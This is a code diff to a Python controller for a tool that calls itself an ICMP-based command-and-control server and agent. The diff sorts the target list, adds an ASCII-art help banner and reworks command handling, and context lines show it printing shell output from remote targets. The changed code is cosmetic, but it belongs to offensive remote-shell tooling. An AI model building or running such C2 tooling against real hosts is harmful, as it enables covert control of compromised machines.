@@ -33,6 +33,8 @@ class Controller(Host):
         response = "[ Targets ]\n"
 
         targets = self.db.all()
+        targets = sorted(targets, key=lambda d: d['id'])
+
         for target in targets:
             response += f"[*] {target['id']}\n"
             response += f" --> {target['ip']}\n"
@@ -83,6 +85,18 @@ class Controller(Host):
             print(f"{shellpack['data'].decode()}")
             shell_lock.value = False
 
+    def help(self):
+        help =  "     _          _ _       \n"
+        help += "    | |        | | |      \n"
+        help += " ___| |__   ___| | |_   _ \n"
+        help += "/ __| '_ \ / _ \ | | | | |\n"
+        help += "\__ \ | | |  __/ | | |_| |\n"
+        help += "|___/_| |_|\___|_|_|\__, |\n"
+        help += "                     __/ |\n"
+        help += "                    |___/ \n"
+        help += "An ICMP based C2 server and agent"
+        print(help)
+
 if __name__ == "__main__":
     controller = Controller()
     
@@ -96,10 +110,10 @@ if __name__ == "__main__":
             print("Run a specific module")
         case "broadcast":
             print("Broadcast")
-        case "--help":
-            print("Help command")
+        case "help":
+            controller.help()
         case _:
-            print("Default")
+            controller.help()
 
             
     
